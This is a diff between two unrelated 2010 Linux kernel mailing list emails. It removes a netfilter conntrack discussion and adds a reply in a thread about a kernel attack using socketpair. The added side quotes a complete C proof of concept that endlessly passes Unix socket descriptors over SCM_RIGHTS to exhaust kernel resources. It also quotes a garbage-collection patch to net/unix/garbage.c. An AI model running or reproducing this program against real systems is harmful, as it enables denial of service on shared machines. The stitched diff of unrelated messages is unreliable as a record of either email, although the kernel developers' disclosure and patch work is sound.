@@ -1,78 +1,123 @@
-From: Eric Dumazet <eric.dumazet@gmail.com>
-Subject: Re: [RFC] netfilter: conntrack race between dump_table and destroy
-Date: Thu, 25 Nov 2010 07:34:33 +0100
-Message-ID: <1290666873.2798.89.camel@edumazet-laptop>
-References: <20101124222716.437c5547@nehalam>
+From: =?UTF-8?B?0JzQsNGA0Log0JrQvtGA0LXQvdCx0LXRgNCz?=
+	<socketpair@gmail.com>
+Subject: Re: Simple kernel attack using socketpair. easy, 100% reproductiblle,
+ works under guest. no way to protect :(
+Date: Thu, 25 Nov 2010 11:52:47 +0500
+Message-ID: <AANLkTik8Fxmd-KwGw498fMyONfVNteFcfCmz+9-V_QZh@mail.gmail.com>
+References: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
+	<1290666501.2798.84.camel@edumazet-laptop>
 Mime-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: QUOTED-PRINTABLE
-Cc: Patrick McHardy <kaber@trash.net>,
-	"Paul E. McKenney" <paulmck@linux.vnet.ibm.com>,
-	netdev@vger.kernel.org, netfilter-devel@vger.kernel.org
-To: Stephen Hemminger <shemminger@vyatta.com>
-Return-path: <netfilter-devel-owner@vger.kernel.org>
-In-Reply-To: <20101124222716.437c5547@nehalam>
-Sender: netfilter-devel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+To: Eric Dumazet <eric.dumazet@gmail.com>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from mail-bw0-f46.google.com ([209.85.214.46]:62497 "EHLO
+	mail-bw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751824Ab0KYGws convert rfc822-to-8bit (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Thu, 25 Nov 2010 01:52:48 -0500
+Received: by bwz15 with SMTP id 15so573918bwz.19
+        for <netdev@vger.kernel.org>; Wed, 24 Nov 2010 22:52:47 -0800 (PST)
+In-Reply-To: <1290666501.2798.84.camel@edumazet-laptop>
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-Le mercredi 24 novembre 2010 =C3=A0 22:27 -0800, Stephen Hemminger a =C3=
-=A9crit :
-> A customer reported a crash and the backtrace showed that
-> ctnetlink_dump_table was running while a conntrack entry was
-> being destroyed.  It looks like the code for walking the table
-> with hlist_nulls_for_each_entry_rcu is not correctly handling the
-> case where it finds a deleted entry.
->=20
-> According to RCU documentation, when using hlist_nulls the reader
-> must handle the case of seeing a deleted entry and not proceed
-> further down the linked list.  For lookup the correct behavior would
-> be to restart the scan, but that would generate duplicate entries.
->=20
-> This patch is the simplest one of three alternatives:
->   1) if dead entry detected, skip the rest of the hash chain (see bel=
-ow)
->   2) remember skb location at start of hash chain and rescan that cha=
-in
->   3) switch to using a full lock when scanning rather than RCU.
-> It all depends on the amount of effort versus consistency of results.
->=20
-> Signed-off-by: Stephen Hemminger <shemminger@vyatta.com>
->=20
->=20
-> --- a/net/netfilter/nf_conntrack_netlink.c	2010-11-24 14:11:27.661682=
-148 -0800
-> +++ b/net/netfilter/nf_conntrack_netlink.c	2010-11-24 14:22:28.431980=
-247 -0800
-> @@ -651,8 +651,12 @@ restart:
->  			if (NF_CT_DIRECTION(h) !=3D IP_CT_DIR_ORIGINAL)
->  				continue;
->  			ct =3D nf_ct_tuplehash_to_ctrack(h);
-> +
-> +			/* if entry is being deleted then can not proceed
-> +			 * past this point. */
->  			if (!atomic_inc_not_zero(&ct->ct_general.use))
-> -				continue;
-> +				break;
-> +
->  			/* Dump entries of a given L3 protocol number.
->  			 * If it is not specified, ie. l3proto =3D=3D 0,
->  			 * then dump everything. */
-> --
+Well, It seems, that patch likely will fix 100% CPU usage.
 
-Hmm...
-
-How restarting the loop can be a problem ?=20
-
-There must be a bug somewhere else that your patch try to avoid, not to
-really fix.
-
-Normally, destroyed ct is removed eventually from the chain, so this
-lookup should stop.
+But what about eating all available descriptors in kernel ? vulnerabili=
+ty ?
 
 
+2010/11/25 Eric Dumazet <eric.dumazet@gmail.com>:
+> Le jeudi 25 novembre 2010 =C3=A0 10:57 +0500, =D0=9C=D0=B0=D1=80=D0=BA=
+ =D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3 a =C3=A9crit :
+>> #include <sys/socket.h>
+>> #include <sys/un.h>
+>>
+>> static int send_fd (int unix_fd, int fd)
+>> {
+>> =C2=A0 struct msghdr msgh;
+>> =C2=A0 struct cmsghdr *cmsg;
+>> =C2=A0 char buf[CMSG_SPACE (sizeof (fd))];
+>>
+>> =C2=A0 memset (&msgh, 0, sizeof (msgh));
+>> =C2=A0 memset (buf, 0, sizeof (buf));
+>>
+>> =C2=A0 msgh.msg_control =3D buf;
+>> =C2=A0 msgh.msg_controllen =3D sizeof (buf);
+>>
+>> =C2=A0 cmsg =3D CMSG_FIRSTHDR (&msgh);
+>> =C2=A0 cmsg->cmsg_len =3D CMSG_LEN (sizeof (fd));
+>> =C2=A0 cmsg->cmsg_level =3D SOL_SOCKET;
+>> =C2=A0 cmsg->cmsg_type =3D SCM_RIGHTS;
+>>
+>> =C2=A0 msgh.msg_controllen =3D cmsg->cmsg_len;
+>>
+>> =C2=A0 memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
+>> =C2=A0 return sendmsg (unix_fd, &msgh, 0);
+>> }
+>>
+>>
+>> int main ()
+>> {
+>> =C2=A0 int fd[2], ff[2];
+>> =C2=A0 int target;
+>>
+>> =C2=A0 if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)=3D=3D-1)
+>> =C2=A0 =C2=A0 return 1;
+>>
+>> =C2=A0 for (;;)
+>> =C2=A0 {
+>> =C2=A0 =C2=A0 if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)=3D=3D-=
+1)
+>> =C2=A0 =C2=A0 =C2=A0 =C2=A0 return 2;
+>> =C2=A0 =C2=A0 send_fd (ff[0], fd[0]);
+>> =C2=A0 =C2=A0 send_fd (ff[0], fd[1]);
+>> =C2=A0 =C2=A0 close (fd[1]);
+>> =C2=A0 =C2=A0 close (fd[0]);
+>> =C2=A0 =C2=A0 fd[0] =3D ff[0];
+>> =C2=A0 =C2=A0 fd[1] =3D ff[1];
+>> =C2=A0 }
+>> }
+>
+>
+> Since you obviously read recent mails on this subject yesterday, why
+> dont you Cc netdev ?
+>
+> There is a very easy way to protect against this actually.
+>
+> A patch was posted yesterday, and need some adjustements.
+>
+>
+> diff --git a/net/unix/garbage.c b/net/unix/garbage.c
+> index c8df6fd..40df93d 100644
+> --- a/net/unix/garbage.c
+> +++ b/net/unix/garbage.c
+> @@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_s=
+ock *u)
+> =C2=A0}
+>
+> =C2=A0static bool gc_in_progress =3D false;
+> +#define UNIX_INFLIGHT_TRIGGER_GC 2000
+>
+> =C2=A0void wait_for_unix_gc(void)
+> =C2=A0{
+> + =C2=A0 =C2=A0 =C2=A0 /*
+> + =C2=A0 =C2=A0 =C2=A0 =C2=A0* If number of inflight sockets is insan=
+e,
+> + =C2=A0 =C2=A0 =C2=A0 =C2=A0* force a garbage collect right now.
+> + =C2=A0 =C2=A0 =C2=A0 =C2=A0*/
+> + =C2=A0 =C2=A0 =C2=A0 if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_=
+GC && !gc_in_progress)
+> + =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 unix_gc();
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0wait_event(unix_gc_wait, gc_in_progress =3D=
+=3D false);
+> =C2=A0}
+>
+>
+>
+>
 
---
-To unsubscribe from this list: send the line "unsubscribe netfilter-dev=
-el" in
-the body of a message to majordomo@vger.kernel.org
-More majordomo info at  http://vger.kernel.org/majordomo-info.html
+
+
+--=20
+Segmentation fault
